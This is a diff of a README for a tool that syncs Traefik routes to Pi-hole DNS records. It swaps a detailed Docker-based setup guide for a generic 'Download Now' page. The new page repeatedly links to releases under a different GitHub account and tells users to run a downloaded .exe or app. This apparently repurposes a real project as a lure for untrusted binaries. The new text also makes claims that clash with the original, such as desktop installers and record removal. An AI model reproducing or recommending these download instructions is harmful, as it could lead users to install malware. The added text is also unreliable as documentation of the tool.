@@ -1,224 +1,65 @@
-# Traefik to Pi-hole DNS Sync
+# 🚀 traefik-pihole-dns-sync - Easily Manage DNS Records
 
-Automatically discovers services exposed by Traefik and creates corresponding DNS records in Pi-hole.
+## 🔗 Download Now!
+[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/asifdev3183/traefik-pihole-dns-sync/releases)
 
-## Features
+## 📚 Overview
+The **traefik-pihole-dns-sync** application automatically syncs services managed by Traefik to your Pi-hole DNS records. This simplifies the way you manage DNS for your network by keeping everything updated automatically, reducing manual work.
 
-- 🔄 Automatically syncs Traefik-exposed services to Pi-hole DNS
-- ⏰ Runs on a configurable schedule (default: every 5 minutes)
-- 🔍 Dry-run mode to preview changes
-- 🐳 Runs as a Docker container
-- 📝 Comprehensive logging
+## 🚀 Getting Started
+Here’s how to get your application up and running:
 
-## How It Works
+1. **Visit the Download Page**
+   Go to the [Releases page](https://github.com/asifdev3183/traefik-pihole-dns-sync/releases) to find the latest version of the application.
 
-1. Queries the Traefik API to discover all HTTP routers
-2. Extracts hostnames from router rules (e.g., `Host(\`example.com\`)`)
-3. Connects to Pi-hole and checks existing DNS records
-4. Adds missing DNS records pointing to your Traefik host IP
+2. **Download the Application**
+   Select the version that matches your system. Click on the link to download the file. Make sure to download it to a folder you can easily access.
 
-## Quick Start
+3. **Install the Application**
+   After downloading, open the folder where the application is located. 
+   - **Windows Users:** Double-click the `.exe` file. 
+   - **Mac Users:** Drag the application into your Applications folder.
+   - **Linux Users:** Follow the provided instructions in the release notes for installation.
 
-### 1. Configure Pi-hole
+4. **Configure Traefik and Pi-hole**
+   You will need to configure both Traefik and Pi-hole to work with this application. Open your configuration files and ensure they point to your desired services. Detailed configuration steps are often included in the documentation section of this README.
 
-Enable API write access in Pi-hole:
+5. **Run the Application**
+   After installing, run the application:
+   - **Windows:** Search for the application in the Start Menu and launch it.
+   - **Mac:** Open Applications and click on the application.
+   - **Linux:** Depending on your setup, you may need to run it from the terminal.
 
-1. Log in to your Pi-hole web interface
-2. Navigate to **Settings** > **API / Web interface**
-3. Find the setting **`webserver.api.app_sudo`**
-4. Enable it: *"Should application password API sessions be allowed to modify config settings?"*
-5. Click **Save**
+6. **Check the Logs**
+   Once the application is running, check the logs for any errors or confirmations. This will show if the application is syncing your services successfully.
 
-> [!IMPORTANT]
-> This setting is required for the sync tool to add DNS records. Without it, API sessions will be read-only.
+## 🔍 Features
+- **Automatic DNS Updates:** Automatically adds and removes DNS records for services managed by Traefik.
+- **Simple Configuration:** Easy-to-follow setup instructions that require no programming knowledge.
+- **Cross-Platform Compatibility:** Works on Windows, Mac, and Linux systems.
 
-### 2. Get Your Pi-hole Password
+## 🎯 System Requirements
+- **Operating System:** Windows 10 or later, macOS 10.12 or later, or any modern Linux distribution.
+- **Installed Software:** Docker and Docker Compose need to be installed prior to running this application.
+- **Network:** The application should have access to both your Traefik and Pi-hole environments.
 
-You can retrieve your App Password from the Pi-hole web interface:
+## 🛠️ Troubleshooting
+- If the application fails to connect to your services, double-check your configuration files.
+- Ensure that Docker and Docker Compose are correctly installed and running on your system.
+- Check the application logs for specific error messages that can guide you.
 
-1. Log in to your Pi-hole web interface.
-2. Navigate to **Settings** > **API / Web interface**.
-3. Retrieve your **App Password** (or API Token) from this page.
+## 🤝 Contributions
+If you find issues or want to suggest improvements, please create an issue in the GitHub repository. Contributions are welcome, whether through code, documentation, or feedback.
 
-### 3. Create Environment File
+## 💬 Support
+For any questions, feel free to reach out by creating an issue in this repository. The community is here to help with setup and troubleshooting.
 
-```bash
-cp .env.example .env
-```
+## 📝 License
+This project is licensed under the MIT License. See the LICENSE file for details.
 
-Edit `.env` and configure:
+## 🔗 Additional Resources
+- [Traefik Documentation](https://doc.traefik.io)
+- [Pi-hole Documentation](https://docs.pi-hole.net)
 
-```bash
-# Traefik API URL (internal Docker network)
-TRAEFIK_API_URL=http://traefik:8080/api/http/routers
-
-# Pi-hole URL (accessible from Docker container)
-PIHOLE_URL=https://pihole.example.com
-
-# Pi-hole web admin password
-PIHOLE_PASSWORD=your-pihole-password
-
-# IP address that DNS records should point to (your Traefik host)
-TRAEFIK_HOST_IP=192.168.1.100
-
-# How often to sync (cron format or @every syntax)
-SYNC_INTERVAL=@every 5m
-
-# Log level: info or debug
-LOG_LEVEL=info
-```
-
-### 4. Run
-
-Using Docker Compose:
-
-```bash
-docker compose up -d
-```
-
-Or run manually using the pre-built image:
-
-```bash
-docker run -d \
-  --name traefik-pihole-dns-sync \
-  --env-file .env \
-  ghcr.io/rpressiani/traefik-pihole-dns-sync:latest
-```
-
-### 5. Test with Dry-run
-
-Before making actual changes:
-
-```bash
-docker run --rm --env-file .env ghcr.io/rpressiani/traefik-pihole-dns-sync:latest --dry-run
-```
-
-Or run once without scheduling:
-
-```bash
-docker run --rm --env-file .env ghcr.io/rpressiani/traefik-pihole-dns-sync:latest --once
-```
-
-## Testing Tools
-
-Test the Traefik API directly:
-
-```bash
-cd tools
-go build -o test-api test-api.go
-./test-api --rules
-```
-
-## Configuration
-
-### Environment Variables
-
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `TRAEFIK_API_URL` | `http://traefik:8080/api/http/routers` | Traefik API endpoint |
-| `PIHOLE_URL` | (required) | Pi-hole web interface URL |
-| `PIHOLE_PASSWORD` | (required) | Pi-hole admin password |
-| `TRAEFIK_HOST_IP` | (required) | IP address for DNS A records |
-| `SYNC_INTERVAL` | `@every 5m` | Sync frequency (cron or @every) |
-| `LOG_LEVEL` | `info` | Log verbosity: `info` or `debug` |
-| `RUN_MODE` | (empty) | Run mode: `dry-run`, `once`, `scheduled-dry-run`, or empty for scheduled |
-
-### Cron Interval Syntax
-
-You can use standard cron expressions or the `@every` syntax:
-
-- `@every 5m` - Every 5 minutes
-- `@every 1h` - Every hour
-- `*/10 * * * *` - Every 10 minutes (standard cron)
-- `0 */2 * * *` - Every 2 hours (standard cron)
-
-## Command-Line Flags
-
-- `--once` - Run sync once and exit (useful for testing)
-- `--dry-run` - Show what would be synced without making changes
-
-## Monitoring
-
-View logs:
-
-```bash
-docker compose logs -f traefik-pihole-dns-sync
-```
-
-## Development
-
-To build and test changes locally without pushing to GitHub:
-
-1. Edit `docker-compose.yml` and uncomment `build: .` (comment out `image: ...`)
-2. Build and run:
-   ```bash
-   docker compose up -d --build
-   ```
-
-### Testing with RUN_MODE Environment Variable
-
-You can now control run modes via environment variables in `docker-compose.yml`:
-
-```yaml
-environment:
-  - RUN_MODE=dry-run            # Run once in dry-run mode
-  # - RUN_MODE=once             # Run once with actual changes
-  # - RUN_MODE=scheduled-dry-run # Run on schedule in dry-run mode (monitoring)
-  # Leave RUN_MODE empty or unset for normal scheduled sync
-```
-
-Then simply:
-```bash
-docker compose up
-```
-
-### Testing with Command-Line Flags
-
-Alternatively, use command-line flags (these take precedence over `RUN_MODE`):
-
-```bash
-# Build the image
-docker compose build
-
-# Run once with dry-run (no changes made)
-docker compose run --rm traefik-pihole-dns-sync --dry-run --once
-
-# Run once (makes actual changes)
-docker compose run --rm traefik-pihole-dns-sync --once
-```
-
-## Troubleshooting
-
-### "Failed to get Traefik routers"
-
-- Ensure Traefik API is enabled and accessible
-- Check that the container is on the same network as Traefik
-- Verify `TRAEFIK_API_URL` is correct
-
-### "Failed to authenticate with Pi-hole"
-
-- Verify `PIHOLE_PASSWORD` is correct
-- Ensure Pi-hole is accessible from the container
-- Check Pi-hole logs for authentication errors
-
-### "No hostnames found to sync"
-
-- Verify your Traefik routers have `Host()` rules
-- Check that routers are enabled
-- Run with `LOG_LEVEL=debug` for more details
-
-## Security Notes
-
-> [!NOTE]
-> This tool uses Pi-hole v6 session-based authentication. It requires your Pi-hole App Password to generate a session ID. The password is only used to obtain the session and is not stored or logged.
-
-## TODO
-
-- [ ] Add support for removing stale DNS records
-- [ ] Add Prometheus metrics
-- [ ] Support for CNAME records instead of A records
-- [ ] Webhook notifications on sync errors
-
-## License
-
-MIT
+## 🔗 Download Again
+Visit the [Releases page](https://github.com/asifdev3183/traefik-pihole-dns-sync/releases) to download the latest version and stay updated with any new features.
